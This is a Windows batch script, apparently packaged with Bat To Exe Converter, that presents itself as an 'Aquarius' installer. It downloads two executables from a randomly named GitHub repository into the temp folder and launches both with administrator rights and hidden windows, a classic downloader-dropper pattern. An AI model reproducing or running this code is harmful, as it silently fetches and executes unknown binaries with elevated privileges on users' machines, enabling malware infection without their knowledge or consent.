::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJGmR+FI5PCd1XRGDLmKvFZwS+/z64+aCsAMYTOdf
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
set TEMP_DIR=%temp%

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Yuta1111x/GSJRWGSDFWETGSEWG/raw/main/setup.exe' -OutFile '%TEMP_DIR%\setup.exe'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Yuta1111x/GSJRWGSDFWETGSEWG/raw/main/AquariusInstallerMenu.exe' -OutFile '%TEMP_DIR%\AquariusInstallerMenu.exe'"

powershell -Command "Start-Process -FilePath '%TEMP_DIR%\setup.exe' -Verb RunAs -WindowStyle Hidden"
powershell -Command "Start-Process -FilePath '%TEMP_DIR%\AquariusInstallerMenu.exe' -Verb RunAs -WindowStyle Hidden"

exit